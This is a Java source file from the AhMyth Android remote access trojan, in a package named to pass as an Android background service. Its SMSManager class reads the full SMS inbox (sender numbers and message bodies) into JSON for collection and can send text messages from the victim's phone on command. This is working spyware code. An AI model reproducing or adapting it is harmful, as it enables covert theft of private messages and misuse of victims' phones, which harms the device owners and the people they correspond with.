package com.android.background.services.helpers;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import com.android.background.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/10/16.
 */

public class SMSManager {

    public static JSONObject getSMSList(){

        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();


            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            @SuppressLint("Recycle") Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);

            while (cur.moveToNext()) {
                JSONObject sms = new JSONObject();
                @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                sms.put("phoneNo" , address);
                sms.put("msg" , body);
                list.put(sms);

            }
            SMSList.put("smsList", list);
            Log.e("done" ,"collecting");
            return SMSList;
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;

    }

    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }

    }


}
